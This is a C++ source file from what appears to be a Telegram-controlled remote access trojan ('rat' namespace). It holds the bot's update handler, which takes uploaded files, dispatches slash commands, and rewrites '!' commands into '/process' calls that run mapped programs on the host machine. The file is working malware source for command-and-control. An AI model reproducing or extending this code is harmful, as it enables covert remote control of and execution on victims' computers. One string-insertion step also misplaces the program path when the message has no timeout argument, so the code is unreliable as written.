/*rat_handler/src/handleUpdate.cpp*/
#include "rat/system.hpp"
#include "rat/Handler.hpp"
#include <boost/algorithm/string.hpp>
#include <algorithm>
#include <cstdint>
#include <filesystem>
#include <optional>
#include "logging.hpp"
#include "rat/networking.hpp"

namespace rat::handler{


// Handle Telegram update
void Handler::handleUpdate(rat::tbot::Update&& arg_Update) {
    this->telegram_update = std::move(arg_Update);
    const auto& t_message = this->telegram_update.message; 

    if (t_message.id == 0) {
        DEBUG_LOG("Empty Update");
        return;
    }

    if (!t_message.files.empty()) {
        DEBUG_LOG("Handling uploaded files to the bot");
        this->handleMessageWithUploadedFiles();
        return;
    } 
 // Example: dynamic command prefix, say messages starting with "!"
    if (!t_message.text.empty() && t_message.text[0] == '!') {
        this->dynamic_command_dispatch();
    }

    // Check if message starts with "/"
    else if (!t_message.text.empty() && t_message.text[0] == '/') {
        this->dispatch();
    }
}

void Handler::dynamic_command_dispatch() {
    std::string command_text = this->telegram_update.message.text;

    if (!command_text.starts_with("!")) {
        return; // not a dynamic command
    }

    // Split "!directive rest"
    size_t first_space = command_text.find(' ');
    if (first_space == std::string::npos) {
        this->bot.sendMessage("Usage: !<command> <timeout> <args...>");
        return;
    }

    std::string directive = command_text.substr(1, first_space - 1); // remove '!'
    std::string rest = command_text.substr(first_space + 1);
    boost::trim(rest);

    // Lookup in map
    auto it = this->state.dynamic_commands.find(directive);
    if (it == this->state.dynamic_commands.end()) {
        this->bot.sendMessage(fmt::format("Unknown command: '{}'", directive));
        return;
    }

    std::string real_path = it->second;

    // Rewrite update message into /process form
    // "/process <timeout> <real_path> <args>"
    std::string new_message = "/process " + rest;
    new_message.insert(new_message.find(' ', 9) + 1, real_path + " "); 
    // insert the path after timeout

    // Overwrite the update so process handler sees it
    this->telegram_update.message.text = new_message;

    // Delegate to existing handler
    this->parseAndHandleProcessCommand();
}
// Dispatch method
void Handler::dispatch() {
    // Parse once and store in class member for handlers that need it
    DEBUG_LOG("Dispatching commands based on the update {}", this->telegram_update.id);
    command = parseTelegramMessageToCommand();
    
    for (const auto& handler : command_map) {
        if (command.directive == handler.command) {
            (this->*handler.handler)();
            return;
        }
    }
    // Handle unknown command
    this->bot.sendMessage(fmt::format("Unknown command: {}", command.directive));
}

} // namespace rat::handler
